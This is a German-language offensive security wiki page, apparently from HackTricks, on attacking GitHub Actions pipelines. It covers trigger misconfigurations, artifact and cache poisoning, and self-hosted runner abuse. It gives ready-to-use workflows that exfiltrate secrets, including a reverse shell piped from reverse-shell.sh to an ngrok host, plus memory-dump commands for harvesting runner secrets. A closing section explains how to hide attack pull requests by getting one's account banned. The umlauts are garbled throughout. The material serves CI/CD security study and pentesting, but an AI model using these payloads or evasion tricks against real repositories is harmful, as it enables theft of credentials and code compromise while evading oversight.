# Missbrauch von Github Actions

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## Grundlegende Informationen

Auf dieser Seite findest du:

* Eine **Zusammenfassung aller Auswirkungen**, wenn ein Angreifer es schafft, auf eine Github Action zuzugreifen
* Verschiedene Wege, um **Zugriff auf eine Action zu erhalten**:
* **Berechtigungen** haben, um die Action zu erstellen
* Missbrauch von **Pull-Request**-bezogenen Triggern
* Missbrauch von **anderen externen Zugriffstechniken**
* **Pivoting** von einem bereits kompromittierten Repo
* Schlie√ülich ein Abschnitt √ºber **Post-Exploitation-Techniken, um eine Action von innen zu missbrauchen** (um die genannten Auswirkungen zu verursachen)

## Zusammenfassung der Auswirkungen

F√ºr eine Einf√ºhrung zu [**Github Actions, siehe die grundlegenden Informationen**](../basic-github-information.md#github-actions).

Falls du **beliebige Github Actions ausf√ºhren/Code injizieren** in einem **Repository** kannst, k√∂nntest du in der Lage sein:

* Die **Geheimnisse** dieses Repos/Organisation zu **stehlen**.
* Wenn du nur injizieren kannst, kannst du alles stehlen, was bereits im Workflow vorhanden ist.
* **Repo-Berechtigungen** missbrauchen, um auf andere Plattformen wie AWS und GCP zuzugreifen.
* **Code in benutzerdefinierten Workern ausf√ºhren** (falls benutzerdefinierte Worker verwendet werden) und versuchen, von dort aus zu pivotieren.
* Repository-**Code √ºberschreiben**.
* Dies h√§ngt von den Berechtigungen des `GITHUB_TOKEN` ab (falls vorhanden).
* **Deployments** und andere **Artefakte kompromittieren**.
* Wenn der Code etwas deployt oder speichert, k√∂nntest du das modifizieren und weiteren Zugriff erhalten.

## GITHUB\_TOKEN

Dieses "**Geheimnis**" (stammt von `${{ secrets.GITHUB_TOKEN }}` und `${{ github.token }}`) wird gegeben, wenn der Admin diese Option aktiviert:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

Dieses Token ist dasselbe, das eine **Github-Anwendung verwenden wird**, daher kann es auf dieselben Endpunkte zugreifen: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github sollte einen [**Flow**](https://github.com/github/roadmap/issues/74) ver√∂ffentlichen, der **Cross-Repository**-Zugriff innerhalb von GitHub erm√∂glicht, sodass ein Repo auf andere interne Repos mit dem `GITHUB_TOKEN` zugreifen kann.
{% endhint %}

Du kannst die m√∂glichen **Berechtigungen** dieses Tokens hier sehen: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Beachte, dass das Token **nach Abschluss des Jobs abl√§uft**.\
Diese Tokens sehen so aus: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Einige interessante Dinge, die du mit diesem Token tun kannst:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="PR genehmigen" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="PR erstellen" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Beachten Sie, dass Sie in mehreren F√§llen **Github-Benutzertoken in Github Actions-Umgebungen oder in den Secrets** finden k√∂nnen. Diese Token k√∂nnen Ihnen mehr Privilegien √ºber das Repository und die Organisation geben.
{% endhint %}

<details>

<summary>Secrets im Github Action-Ausgabe auflisten</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Reverse Shell mit Secrets erhalten</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Es ist m√∂glich, die Berechtigungen eines Github Tokens in den Repositories anderer Benutzer zu √ºberpr√ºfen, indem man die **Logs** der Aktionen √ºberpr√ºft:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Erlaubte Ausf√ºhrung

{% hint style="info" %}
Dies w√§re der einfachste Weg, Github Actions zu kompromittieren, da dieser Fall voraussetzt, dass Sie Zugriff haben, um **ein neues Repository in der Organisation zu erstellen** oder **Schreibrechte √ºber ein Repository** besitzen.

Wenn Sie sich in diesem Szenario befinden, k√∂nnen Sie einfach die [Post Exploitation Techniken](./#post-exploitation-techniques-from-inside-an-action) √ºberpr√ºfen.
{% endhint %}

### Ausf√ºhrung durch Repository-Erstellung

Falls Mitglieder einer Organisation **neue Repositories erstellen** k√∂nnen und Sie Github Actions ausf√ºhren k√∂nnen, k√∂nnen Sie **ein neues Repository erstellen und die auf Organisationsebene gesetzten Secrets stehlen**.

### Ausf√ºhrung durch einen neuen Branch

Wenn Sie **einen neuen Branch in einem Repository erstellen k√∂nnen, das bereits eine Github Action** konfiguriert hat, k√∂nnen Sie diese **modifizieren**, den Inhalt **hochladen** und dann **diese Aktion vom neuen Branch ausf√ºhren**. Auf diese Weise k√∂nnen Sie **Repository- und Organisationsebene-Secrets exfiltrieren** (aber Sie m√ºssen wissen, wie sie genannt werden).

Sie k√∂nnen die modifizierte Aktion **manuell** ausf√ºhrbar machen, wenn ein **PR erstellt wird** oder wenn **einige Codes gepusht werden** (abh√§ngig davon, wie auff√§llig Sie sein m√∂chten):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Geforkte Ausf√ºhrung

{% hint style="info" %}
Es gibt verschiedene Ausl√∂ser, die einem Angreifer erm√∂glichen k√∂nnten, eine **Github Action eines anderen Repositorys auszuf√ºhren**. Wenn diese ausl√∂sbaren Aktionen schlecht konfiguriert sind, k√∂nnte ein Angreifer in der Lage sein, sie zu kompromittieren.
{% endhint %}

### `pull_request`

Der Workflow-Ausl√∂ser **`pull_request`** wird den Workflow jedes Mal ausf√ºhren, wenn ein Pull-Request eingeht, mit einigen Ausnahmen: Standardm√§√üig, wenn es das **erste Mal** ist, dass Sie **mitarbeiten**, muss ein **Maintainer** die **Ausf√ºhrung** des Workflows **genehmigen**:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Da die **Standardbeschr√§nkung** f√ºr **Erstbeitr√§ger** gilt, k√∂nnten Sie **einen g√ºltigen Fehler/Tippfehler beheben** und dann **andere PRs senden, um Ihre neuen `pull_request`-Berechtigungen zu missbrauchen**.

**Ich habe das getestet und es funktioniert nicht**: ~~Eine andere M√∂glichkeit w√§re, ein Konto mit dem Namen einer Person zu erstellen, die zum Projekt beigetragen hat und ihr Konto gel√∂scht hat.~~
{% endhint %}

Dar√ºber hinaus **verhindert** es standardm√§√üig **Schreibberechtigungen** und **Zugriff auf Geheimnisse** des Ziel-Repositorys, wie in den [**Dokumentationen**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories) erw√§hnt:

> Mit Ausnahme von `GITHUB_TOKEN` werden **Geheimnisse nicht an den Runner √ºbergeben**, wenn ein Workflow von einem **geforkten** Repository ausgel√∂st wird. Das **`GITHUB_TOKEN` hat nur Lesezugriff** in Pull-Requests **von geforkten Repositorys**.

Ein Angreifer k√∂nnte die Definition der Github Action √§ndern, um beliebige Dinge auszuf√ºhren und beliebige Aktionen hinzuzuf√ºgen. Er wird jedoch aufgrund der genannten Einschr√§nkungen keine Geheimnisse stehlen oder das Repository √ºberschreiben k√∂nnen.

{% hint style="danger" %}
**Ja, wenn der Angreifer im PR die Github Action √§ndert, die ausgel√∂st wird, wird seine Github Action verwendet und nicht die aus dem urspr√ºnglichen Repository!**
{% endhint %}

Da der Angreifer auch den ausgef√ºhrten Code kontrolliert, k√∂nnte er, selbst wenn es keine Geheimnisse oder Schreibberechtigungen f√ºr das `GITHUB_TOKEN` gibt, beispielsweise **b√∂sartige Artefakte hochladen**.

### **`pull_request_target`**

Der Workflow-Ausl√∂ser **`pull_request_target`** hat **Schreibberechtigung** f√ºr das Ziel-Repository und **Zugriff auf Geheimnisse** (und fragt nicht nach Erlaubnis).

Beachten Sie, dass der Workflow-Ausl√∂ser **`pull_request_target`** im **Basis-Kontext** und nicht im durch den PR gegebenen Kontext ausgef√ºhrt wird (um **keinen unzuverl√§ssigen Code auszuf√ºhren**). Weitere Informationen zu `pull_request_target` finden Sie in den [**Dokumentationen**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Weitere Informationen zu diesem spezifischen gef√§hrlichen Einsatz finden Sie in diesem [**Github-Blogpost**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Es mag so aussehen, als ob die **ausgef√ºhrte Workflow** der im **Basis** und **nicht im PR** definierte ist, es **sicher** ist, **`pull_request_target`** zu verwenden, aber es gibt **einige F√§lle, in denen es nicht sicher ist**.

Und dieser wird **Zugriff auf Geheimnisse** haben.

### `workflow_run`

Der [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) Ausl√∂ser erm√∂glicht es, einen Workflow von einem anderen auszuf√ºhren, wenn er `completed`, `requested` oder `in_progress` ist.

In diesem Beispiel ist ein Workflow so konfiguriert, dass er nach Abschluss des separaten "Run Tests"-Workflows ausgef√ºhrt wird:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Zudem, laut der Dokumentation: Der durch das `workflow_run`-Ereignis gestartete Workflow kann **Geheimnisse und Schreib-Token zugreifen, selbst wenn der vorherige Workflow dies nicht konnte**.

Diese Art von Workflow k√∂nnte angegriffen werden, wenn er **abh√§ngig** von einem **Workflow** ist, der von einem externen Benutzer √ºber **`pull_request`** oder **`pull_request_target`** **ausgel√∂st** werden kann. Ein paar verwundbare Beispiele k√∂nnen in [**diesem Blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability) **gefunden werden**. Das erste Beispiel besteht darin, dass der durch **`workflow_run`** ausgel√∂ste Workflow den Code des Angreifers herunterl√§dt: `${{ github.event.pull_request.head.sha }}`\
Das zweite Beispiel besteht darin, ein **Artefakt** aus dem **nicht vertrauensw√ºrdigen** Code an den **`workflow_run`**-Workflow zu √ºbergeben und den Inhalt dieses Artefakts auf eine Weise zu verwenden, die es **anf√§llig f√ºr RCE** macht.

### `workflow_call`

TODO

TODO: √úberpr√ºfen, ob bei der Ausf√ºhrung aus einem pull\_request der verwendete/heruntergeladene Code aus dem Original oder aus dem geforkten PR stammt.

## Missbrauch der geforkten Ausf√ºhrung

Wir haben alle M√∂glichkeiten erw√§hnt, wie ein externer Angreifer es schaffen k√∂nnte, einen GitHub-Workflow auszuf√ºhren. Schauen wir uns nun an, wie diese Ausf√ºhrungen, wenn sie schlecht konfiguriert sind, missbraucht werden k√∂nnten:

### Unvertrauensw√ºrdige Checkout-Ausf√ºhrung

Im Fall von **`pull_request`** wird der Workflow im **Kontext des PR** ausgef√ºhrt (also wird der **b√∂sartige PR-Code** ausgef√ºhrt), aber jemand muss ihn **zuerst autorisieren** und er wird mit einigen [Einschr√§nkungen](./#pull\_request) ausgef√ºhrt.

Im Fall eines Workflows, der **`pull_request_target` oder `workflow_run`** verwendet und von einem Workflow abh√§ngt, der von **`pull_request_target` oder `pull_request`** ausgel√∂st werden kann, wird der Code aus dem urspr√ºnglichen Repository ausgef√ºhrt, sodass der **Angreifer den ausgef√ºhrten Code nicht kontrollieren kann**.

{% hint style="danger" %}
Wenn die **Aktion** jedoch einen **expliziten PR-Checkout** hat, der den **Code aus dem PR** (und nicht aus dem Basis-Repository) holt, wird der vom Angreifer kontrollierte Code verwendet. Zum Beispiel (siehe Zeile 12, wo der PR-Code heruntergeladen wird):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># UNSICHER. Nur als Beispiel bereitgestellt.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Der potenziell **unvertrauensw√ºrdige Code wird w√§hrend `npm install` oder `npm build`** ausgef√ºhrt, da die Build-Skripte und referenzierten **Pakete vom Autor des PR kontrolliert werden**.

{% hint style="warning" %}
Ein GitHub-Dork, um nach verwundbaren Aktionen zu suchen, ist: `event.pull_request pull_request_target extension:yml`. Es gibt jedoch verschiedene M√∂glichkeiten, die Jobs sicher zu konfigurieren, selbst wenn die Aktion unsicher konfiguriert ist (z. B. durch die Verwendung von Bedingungen, wer der Akteur ist, der den PR erstellt).
{% endhint %}

### Kontext-Skript-Injektionen <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Beachten Sie, dass es bestimmte [**GitHub-Kontexte**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) gibt, deren Werte **vom Benutzer** kontrolliert werden, der den PR erstellt. Wenn die GitHub-Aktion diese **Daten verwendet, um etwas auszuf√ºhren**, k√∂nnte dies zu **beliebiger Codeausf√ºhrung** f√ºhren:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Skript-Injektion** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Aus der Dokumentation: Sie k√∂nnen eine **Umgebungsvariable f√ºr alle nachfolgenden Schritte** in einem Workflow-Job verf√ºgbar machen, indem Sie die Umgebungsvariable definieren oder aktualisieren und diese in die **`GITHUB_ENV`**-Umgebungsdatei schreiben.

Wenn ein Angreifer **irgendeinen Wert** in diese **env**-Variable injizieren k√∂nnte, k√∂nnte er Umgebungsvariablen injizieren, die in den folgenden Schritten Code ausf√ºhren k√∂nnten, wie **LD\_PRELOAD** oder **NODE\_OPTIONS**.

Zum Beispiel ([**dies**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) und [**dies**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), stellen Sie sich einen Workflow vor, der einem hochgeladenen Artefakt vertraut, um dessen Inhalt in der **`GITHUB_ENV`**-Umgebungsvariable zu speichern. Ein Angreifer k√∂nnte etwas wie dies hochladen, um es zu kompromittieren:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### Verwundbare Drittanbieter-GitHub-Aktionen

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Wie in [**diesem Blogbeitrag**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks) erw√§hnt, erm√∂glicht diese GitHub-Aktion den Zugriff auf Artefakte aus verschiedenen Workflows und sogar Repositories.

Das Problem ist, dass, wenn der **`path`**-Parameter nicht gesetzt ist, das Artefakt im aktuellen Verzeichnis extrahiert wird und Dateien √ºberschreiben kann, die sp√§ter verwendet oder sogar im Workflow ausgef√ºhrt werden k√∂nnten. Daher k√∂nnte ein Angreifer, wenn das Artefakt verwundbar ist, dies ausnutzen, um andere Workflows zu kompromittieren, die dem Artefakt vertrauen.

Beispiel eines verwundbaren Workflows:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Dies k√∂nnte mit diesem Workflow angegriffen werden:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Andere externe Zugriffe

### Gel√∂schtes Namespace-Repo-Hijacking

Wenn ein Konto seinen Namen √§ndert, k√∂nnte ein anderer Benutzer nach einiger Zeit ein Konto mit diesem Namen registrieren. Wenn ein Repository **weniger als 100 Sterne vor der Namens√§nderung** hatte, erlaubt Github dem neuen registrierten Benutzer mit demselben Namen, ein **Repository mit demselben Namen** wie das gel√∂schte zu erstellen.

{% hint style="danger" %}
Wenn eine Aktion ein Repository von einem nicht existierenden Konto verwendet, ist es immer noch m√∂glich, dass ein Angreifer dieses Konto erstellt und die Aktion kompromittiert.
{% endhint %}

Wenn andere Repositories **Abh√§ngigkeiten von diesen Benutzer-Repos** verwendeten, kann ein Angreifer sie hijacken. Hier finden Sie eine ausf√ºhrlichere Erkl√§rung: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo-Pivoting

{% hint style="info" %}
In diesem Abschnitt werden wir √ºber Techniken sprechen, die es erm√∂glichen, **von einem Repo zu einem anderen zu pivotieren**, vorausgesetzt, wir haben irgendeine Art von Zugriff auf das erste (siehe vorherigen Abschnitt).
{% endhint %}

### Cache Poisoning

Ein Cache wird zwischen **Workflow-L√§ufen im selben Branch** beibehalten. Das bedeutet, dass wenn ein Angreifer ein **Paket** kompromittiert, das dann im Cache gespeichert und von einem **privilegierteren** Workflow heruntergeladen und ausgef√ºhrt wird, er auch diesen Workflow kompromittieren kann.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Artifact Poisoning

Workflows k√∂nnten **Artefakte von anderen Workflows und sogar Repos** verwenden. Wenn es einem Angreifer gelingt, die Github Action zu **kompromittieren**, die ein Artefakt **hochl√§dt**, das sp√§ter von einem anderen Workflow verwendet wird, k√∂nnte er **die anderen Workflows kompromittieren**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post-Exploitation von einer Aktion

### Zugriff auf AWS und GCP √ºber OIDC

√úberpr√ºfen Sie die folgenden Seiten:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Zugriff auf Secrets <a href="#accessing-secrets" id="accessing-secrets"></a>

Wenn Sie Inhalte in ein Skript einf√ºgen, ist es interessant zu wissen, wie Sie auf Secrets zugreifen k√∂nnen:

* Wenn das Secret oder Token auf eine **Umgebungsvariable** gesetzt ist, kann es direkt √ºber die Umgebung mit **`printenv`** abgerufen werden.

<details>

<summary>Liste Secrets in Github Action Ausgabe auf</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Reverse Shell mit Secrets erhalten</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Wenn das Geheimnis **direkt in einem Ausdruck** verwendet wird, wird das generierte Shell-Skript **auf der Festplatte** gespeichert und ist zug√§nglich.
* ```bash
cat /home/runner/work/_temp/*
```
* F√ºr eine JavaScript-Aktion werden die Geheimnisse √ºber Umgebungsvariablen gesendet
* ```bash
ps axe | grep node
```
* F√ºr eine **benutzerdefinierte Aktion** kann das Risiko variieren, je nachdem, wie ein Programm das Geheimnis verwendet, das es aus dem **Argument** erhalten hat:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Missbrauch von selbstgehosteten Runnern

Der Weg, um herauszufinden, welche **Github Actions in nicht-Github-Infrastrukturen** ausgef√ºhrt werden, besteht darin, nach **`runs-on: self-hosted`** in der Github Action-Konfigurations-YAML zu suchen.

**Selbstgehostete** Runner k√∂nnten Zugriff auf **zus√§tzliche sensible Informationen**, auf andere **Netzwerksysteme** (verwundbare Endpunkte im Netzwerk? Metadatenservice?) haben oder, selbst wenn sie isoliert und zerst√∂rt werden, **mehr als eine Aktion k√∂nnte gleichzeitig ausgef√ºhrt werden** und die b√∂sartige k√∂nnte **die Geheimnisse der anderen stehlen**.

In selbstgehosteten Runnern ist es auch m√∂glich, die **Geheimnisse aus dem \_Runner.Listener**\_\*\* Prozess\*\* zu erhalten, der alle Geheimnisse der Workflows in jedem Schritt enth√§lt, indem man seinen Speicher ausliest:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Weitere Informationen finden Sie in [**diesem Beitrag**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Es ist m√∂glich, Github Actions zu erstellen, die ein **Docker-Image innerhalb von Github bauen und speichern**.\
Ein Beispiel finden Sie im folgenden ausklappbaren Abschnitt:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Wie Sie im vorherigen Code sehen konnten, wird das Github-Registry in **`ghcr.io`** gehostet.

Ein Benutzer mit Leseberechtigungen f√ºr das Repository kann dann das Docker-Image mit einem pers√∂nlichen Zugriffstoken herunterladen:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Dann k√∂nnte der Benutzer nach **geleakten Geheimnissen in den Docker-Image-Schichten suchen:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Sensible Informationen in Github Actions-Protokollen

Auch wenn **Github** versucht, **geheime Werte** in den Actions-Protokollen zu **erkennen und zu verbergen**, werden **andere sensible Daten**, die w√§hrend der Ausf√ºhrung der Aktion generiert wurden, nicht verborgen. Zum Beispiel wird ein JWT, das mit einem geheimen Wert signiert ist, nicht verborgen, es sei denn, es ist [speziell konfiguriert](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Spuren verwischen

(Technik von [**hier**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Zun√§chst einmal ist jeder PR, der erstellt wird, √∂ffentlich auf Github und f√ºr das Ziel-GitHub-Konto sichtbar. Standardm√§√üig k√∂nnen wir in GitHub **einen PR nicht aus dem Internet l√∂schen**, aber es gibt einen Trick. F√ºr Github-Konten, die von Github **gesperrt** wurden, werden alle ihre **PRs automatisch gel√∂scht** und aus dem Internet entfernt. Um Ihre Aktivit√§ten zu verbergen, m√ºssen Sie entweder Ihr **GitHub-Konto sperren lassen oder Ihr Konto markieren lassen**. Dies w√ºrde **alle Ihre Aktivit√§ten** auf GitHub aus dem Internet verbergen (im Grunde alle Ihre Exploit-PRs entfernen).

Eine Organisation in GitHub ist sehr proaktiv beim Melden von Konten an GitHub. Alles, was Sie tun m√ºssen, ist, ‚Äûeinige Sachen‚Äú in einem Issue zu teilen, und sie werden sicherstellen, dass Ihr Konto innerhalb von 12 Stunden gesperrt wird :p und da haben Sie es, Ihr Exploit ist auf GitHub unsichtbar.

{% hint style="warning" %}
Die einzige M√∂glichkeit f√ºr eine Organisation herauszufinden, dass sie angegriffen wurde, besteht darin, die GitHub-Protokolle von SIEM zu √ºberpr√ºfen, da der PR aus der GitHub-Benutzeroberfl√§che entfernt w√ºrde.
{% endhint %}

## Werkzeuge

Die folgenden Werkzeuge sind n√ºtzlich, um Github Action-Workflows zu finden und sogar verwundbare zu entdecken:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichen.

</details>
{% endhint %}
